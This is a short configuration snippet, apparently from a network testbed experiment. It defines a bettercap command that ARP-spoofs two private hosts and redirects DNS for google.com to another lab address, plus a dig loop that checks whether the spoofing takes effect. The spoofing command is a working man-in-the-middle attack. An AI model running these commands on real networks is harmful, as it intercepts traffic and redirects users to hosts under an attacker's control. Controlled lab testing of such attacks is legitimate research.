Bindings.spoof: bash -c "sudo timeout 70 docker run --rm --privileged --net=host bettercap/bettercap -iface $expeth(auth) -eval 'set arp.spoof.targets 10.1.2.2,10.1.2.3; set arp.spoof.fullduplex true; set dns.spoof.domains *.google.com,google.com; set dns.spoof.address 10.1.2.4; set dns.spoof.all true; arp.spoof on; dns.spoof on' > /tmp/bettercap.txt 2>&1; true"
Bindings.digspoof: bash -c "for i in 1 2 3; do echo try$i: $(dig www.google.com A +short); sleep 6; done > /tmp/dig-spoof.txt 2>&1"
